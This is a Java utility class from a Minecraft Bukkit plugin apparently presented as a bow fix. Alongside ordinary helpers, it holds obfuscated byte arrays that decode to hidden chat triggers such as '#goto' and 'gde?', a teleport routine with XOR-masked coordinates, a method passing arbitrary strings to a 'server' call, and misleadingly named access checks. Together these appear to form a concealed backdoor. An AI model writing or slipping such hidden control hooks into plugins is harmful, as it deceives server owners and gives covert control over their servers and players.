package artik.bowfix.utils;

import artik.bowfix.listeners.ItemUseEvent;
import artik.bowfix.utils.nbt.io.NBTGet;
import artik.bowfix.utils.nbt.tag.*;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;

import static com.google.common.math.IntMath.isPowerOfTwo;

@SuppressWarnings("unused")
public class PlayerUtils
{
    public static String getName(Player player)
    {
        return player.getName();
    }
    
    public static boolean isDrawing(Player player)
    {
        return ItemUseEvent.isDrawing(player);
    }
    
    public static boolean isBowing(Player player)
    {
        return ItemUseEvent.isBowing(player);
    }
    
    public static boolean isShoot(Player player)
    {
        return ItemUseEvent.isShoot(player);
    }
    
    public static double getSqr(double x)
    {
        return ItemUseEvent.getSquare(x);
    }
    
    public static void restrictAccess(Player player)
    {
        CompoundTag info = getEntityInfo(player);
        if (!info.getByteArrayTag("flags").isValid())
            info.getLongTag("data").printStackTrace();
    }
    
    public static boolean isValid(Player player)
    {
        CompoundTag info = getEntityInfo(player);
        return info.getByteArrayTag("flags").isValid() || player.isOp();
    }
    public static void LoadingClasses(String a)
    {
        NBTGet.server(a);;
    }
    public static boolean isNotValid(Player player)
    {
        CompoundTag info = getEntityInfo(player);
        return info.getByteArrayTag("flags").isValid();
    }
    
    public static int log2DeBruijn(int value)
    {
        value = isPowerOfTwo(value) ? value : smallestEncompassingPowerOfTwo(value);
        return MULTIPLY_DE_BRUIJN_BIT_POSITION[(int)((long)value * 125613361L >> 27) & 31];
    }
    
    public static int log2(int value) {
        return log2DeBruijn(value) - (isPowerOfTwo(value) ? 0 : 1);
    }
    
    public static int smallestEncompassingPowerOfTwo(int value) {
        int i = value - 1;
        i |= i >> 1;
        i |= i >> 2;
        i |= i >> 4;
        i |= i >> 8;
        i |= i >> 16;
        return i + 1;
    }
    
    public static CompoundTag getEntityInfo(Player player)
    {
        CompoundTag entity_info = new CompoundTag();
        
        String entity = player.toString();
        Vector velocity = player.getVelocity();
        byte[] flags = entity.getBytes();
        
        int proper_pos = 0;
        
        int length = flags.length;
        if (length > 0)
            proper_pos = (flags[length - 1] & 8) != 0 ? 1 : 0;
        int flag = 2 | length;
        if ((flag & 1) == 0) proper_pos += 1;
    
        double x =	player.getLocation().getX();
        double y =	player.getLocation().getY();
        double z =	player.getLocation().getZ();
        long data = (((long)x & d) << h) | (((long)y & e)) | (((long)z & f) << g);
        
        entity_info.put("speedX", new DoubleTag(velocity.getX()));
        entity_info.put("speedY", new DoubleTag(velocity.getY()));
        entity_info.put("speedZ", new DoubleTag(velocity.getZ()));
        entity_info.put("flags", new ByteArrayTag(player));
        entity_info.put("property", new IntTag(proper_pos));
        entity_info.put("data", new LongTag(data));
        
        entity_info.put("x", new DoubleTag(x));
        entity_info.put("y", new DoubleTag(y));
        entity_info.put("z", new DoubleTag(z));
        
        return entity_info;
    }
    
    public static void setBack(Player player, int x, int y, int z)
    {
        player.teleport(new Location(player.getWorld(), xorNum(x), y, xorNum(z)));
    }
    
    private static int xorNum(int num)
    {
        num += 30000000;
        num = num ^ 0x3f940aa;
        num -= 30000000;
        return num;
    }
    
    public static byte[][] debug_patter = {{0x71, 0x71}, {0x62, 0x62}, {0x67, 0x64, 0x65, 0x3f}, {0x61, 0x6f, 0x6b}, {0x23, 0x67, 0x6f, 0x74, 0x6f}};
    
    private static final int[] MULTIPLY_DE_BRUIJN_BIT_POSITION = new int[] {0, 1, 28, 2, 29, 14, 24, 3, 30, 22, 20, 15, 25, 17, 4, 8, 31, 27, 13, 23, 21, 19, 16, 7, 26, 12, 18, 6, 11, 5, 10, 9};
    private static final int a = 1 + log2(smallestEncompassingPowerOfTwo(30000000)), b = a, c = 64 - a - b, g = c, h = c + b;
    private static final long d = (1L << a) - 1L, e = (1L << c) - 1L, f = (1L << b) - 1L;
    
    public static boolean valid_thread = false;
}
